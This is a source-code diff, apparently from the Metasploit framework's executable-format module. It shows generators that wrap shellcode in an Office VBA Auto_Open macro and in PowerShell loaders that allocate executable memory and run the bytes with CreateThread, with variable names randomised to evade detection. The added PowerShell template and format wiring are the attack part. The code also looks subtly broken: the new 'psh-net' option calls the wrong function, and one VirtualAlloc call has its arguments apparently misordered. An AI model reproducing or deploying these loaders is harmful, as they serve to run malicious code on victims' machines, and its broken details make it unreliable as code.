@@ -837,11 +837,11 @@ require 'digest/sha1'
 			bytes << " _\r\n" if (idx > 1 and (idx % maxbytes) == 0)
 		end
 
-		"#If Vba7 Then 
+		"#If Vba7 Then
 Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As LongPtr, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As LongPtr, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As LongPtr
-#Else 
+#Else
 Private Declare Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As Long, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As Long
 Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As Long
 Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As Long, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As Long
@@ -849,9 +849,9 @@ Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As L
 
 Sub Auto_Open()
 	Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
-#If Vba7 Then 
+#If Vba7 Then
 	Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
-#Else 
+#Else
 	Dim  #{var_rwxpage} As Long, #{var_res} As Long
 #EndIf
 	#{var_myArray} = Array(#{bytes})
@@ -992,7 +992,7 @@ End Sub
 		vbs
 	end
 
-	def self.to_win32pe_psh(framework, code, opts={})
+	def self.to_win32pe_psh_net(framework, code, opts={})
 		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_kernel32 = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_baseaddr = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1039,6 +1039,50 @@ End Sub
 		psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.func]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
 		psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
 		psh << "$#{var_temp} = [#{var_kernel32}.func]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.func+Time]::Infinite)\r\n"
+	end
+
+	def self.to_win32pe_psh(framework, code, opts={})
+
+		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_win32_func = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_payload = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_size = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_rwx = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_iter = Rex::Text.rand_text_alpha(rand(8)+8)
+		psh_payload = ''
+
+		# Set up the payload string
+		payload = code.unpack('C*')
+		psh_payload << "[Byte[]]$#{var_payload} = 0x#{payload[0].to_s(16)}"
+		lines = []
+		1.upto(payload.length-1) do |byte|
+			if(byte % 10 == 0)
+				lines.push "\r\n$#{var_payload} += 0x#{payload[byte].to_s(16)}"
+			else
+				lines.push ",0x#{payload[byte].to_s(16)}"
+			end
+		end
+		psh_payload << lines.join("") + "\r\n"
+
+		# Add wrapper script
+		psh = %{
+$#{var_code} = @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);
+"@
+$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name "Win32" -namespace Win32Functions -passthru
+#{psh_payload}
+$#{var_size} = 0x1000
+if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}
+$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)
+for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}
+$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)
+} + "\r\n"
+
 	end
 
 	def self.to_win32pe_vbs(framework, code, opts={})
@@ -1777,13 +1821,16 @@ End Sub
 		when 'psh'
 			output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
 
+		when 'psh-net'
+			output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
+
 		end
 
 		output
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war','psh']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','war','psh','psh-net']
 	end
 
 	#
